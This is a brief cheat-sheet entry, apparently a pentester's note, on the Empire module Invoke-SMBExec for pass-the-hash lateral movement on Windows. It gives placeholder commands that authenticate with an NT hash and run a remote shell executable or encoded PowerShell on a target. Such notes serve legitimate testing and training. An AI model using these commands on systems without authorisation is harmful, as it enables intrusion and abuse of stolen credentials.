# Invoke-SMBExec

Search Tag(s): #lateral-movement #service-control-manager #windows

## 01 - Syntax

```
PS C:\> Import-Module .\Invoke-SMBExec.ps1

PS C:\> Invoke-SMBExec -Target <target_IP> -Domain <domain> -Username <username> -Hash <nt_hash> -Command "<commands>"
```

## 02 - Usage

```
PS C:\> Invoke-SMBExec -Target <target_IP> -Domain <domain> -Username <username> -Hash <nt_hash> -Command "C:\path\to\remote\shell.exe"

PS C:\> Invoke-SMBExec -Target <target_IP> -Domain <domain> -Username <username> -Hash <nt_hash> -Command "powershell -E <base64_encoded>"
```

---
## References

- [Invoke-SMBExec](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/lateral_movement/Invoke-SMBExec.ps1)